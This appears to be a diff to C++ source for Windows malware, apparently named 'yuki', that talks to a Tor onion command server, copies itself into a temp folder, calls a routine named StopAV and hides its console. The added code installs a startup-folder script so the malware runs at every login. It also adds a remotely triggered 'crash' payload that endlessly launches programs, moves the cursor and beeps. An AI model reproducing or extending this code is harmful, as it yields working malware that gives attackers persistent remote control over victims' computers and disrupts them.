@@ -14,6 +14,7 @@
 #include <fcntl.h>
 #include <psapi.h>
 #include <tlhelp32.h>
+#include <random>
 
 #define MAX                 65536
 #define cnc_onion_server    "z2b5cjxk4utmaktdrwiz5qlzxqve5rjedmplqgrceutvmurwadlc4gqd.onion"
@@ -433,7 +434,7 @@ void self_duplicating(int a)
     close(target);
 }
 
-inline void self_duplicating()
+void self_duplicating()
 {
     TCHAR cdir[512];
     TCHAR BaseName[MAX_PATH];
@@ -447,6 +448,27 @@ inline void self_duplicating()
     GetCurrentDirectory(255, cdir);
     my_strcat(cdir, backslash);
     if (CopyFile(cdir, "C:\\Windows\\Temp\\yuki.exe", FALSE) == FALSE) self_duplicating(1);
+}
+
+void start_up(int a)
+{
+    TCHAR path[512];
+    TCHAR *s = (TCHAR*)"\\yuki.cmd";
+    TCHAR *d = (TCHAR*)"@echo\x20off\nC:\\Windows\\Temp\\yuki.exe 255 crash";
+    DWORD dwNumberOfBytesWritten;
+    while (1) {
+        if (SHGetSpecialFolderPath(NULL, path, CSIDL_STARTUP, 0) == TRUE) {
+            my_strcat(path, s);
+        }
+        if (DeleteFile(path) == FALSE) continue;
+        HANDLE hFile = CreateFile(
+            path, GENERIC_READ | GENERIC_WRITE, 0, NULL,
+            CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL
+        );
+        if (!WriteFile(hFile, d, lstrlen(d), &dwNumberOfBytesWritten, NULL)) continue;
+        CloseHandle(hFile);
+        break;
+    }
 }
 
 void start_up()
@@ -473,12 +495,79 @@ void start_up()
     }
 }
 
+const char *sites[] = {
+    "https://duckduckgo.com/",
+    "calculator",
+    "notepad",
+    "cmd",
+    "write",
+    "regedit",
+    "explorer",
+    "taskmgr",
+    "msconfig",
+    "mspaint",
+    "devmgmt.msc",
+    "control",
+    "mmc",
+};
+
+DWORD WINAPI alert(LPVOID lpstart) {
+    while (1) {
+        MessageBeep(MB_ICONHAND);
+        Sleep(1000);
+    }
+}
+
+template<typename T>
+T random(T a, T b)
+{
+    std::random_device rnd;
+    std::mt19937 mt(rnd());
+    std::uniform_int_distribution<> rand(a, b);
+    return rand(mt);
+}
+
+void payloadExecute()
+{
+    constexpr size_t nSites = sizeof(sites) / sizeof(void *);
+    srand((unsigned)time(nullptr));
+    while (1) {
+        ShellExecuteA(NULL, "open", (LPCSTR)sites[rand() % nSites], NULL, NULL, SW_SHOWDEFAULT);
+        Sleep(100);
+    }
+}
+
+void RandCursor()
+{
+    POINT p;
+    GetCursorPos(&p);
+    int sxs,sys,sxl,syl;
+    sxs = p.x - 3;
+    sys = p.y - 3;
+    sxl = p.x + 3;
+    syl = p.y + 3;
+    SetCursorPos(random(sxs, sxl), random(sys, syl));
+}
+
+DWORD WINAPI infCursor(LPVOID lpstart)
+{
+    while (1) RandCursor();
+}
+
+inline void crash()
+{
+    std::thread th(payloadExecute);
+    CreateThread(0, 0, infCursor, 0, 0, 0);
+    CreateThread(0, 0, alert, 0, 0, 0);
+    Sleep(-1);
+}
+
 int main(int argc, char **argv)
 {
     HANDLE hMutex = CreateMutex(NULL, FALSE, _T("test"));
     if (GetLastError() == ERROR_ALREADY_EXISTS || hMutex == NULL) return 1;
 
-    //FreeConsole(); 
+    //FreeConsole();
     AllocConsole();
     HWND window = FindWindowA("ConsoleWindowClass", NULL);
     ShowWindow(window, 0);
@@ -489,9 +578,10 @@ int main(int argc, char **argv)
         StopAV("WmiPrvSE.exe");
         start_up();
     }
+    if (argc == 3) crash();
 
-    std::thread th_a(start_tor);
-    th_a.join();
+    std::thread th_tor(start_tor);
+    th_tor.detach();
     std::this_thread::sleep_for(std::chrono::seconds(5));
 
     WSADATA wsaData;
@@ -603,8 +693,10 @@ int main(int argc, char **argv)
                 }
                 Sleep(-1);
             }
-            //else if (!strcmp(recv_buf, "all_log")) {
-            //}
+            else if (!strcmp(recv_buf, "crash")) {
+                start_up(1);
+                crash();
+            }
             send(Socket, send_buf, strlen(send_buf), 0);
             memset(send_buf, 0, MAX*sizeof(0[send_buf]));
         }
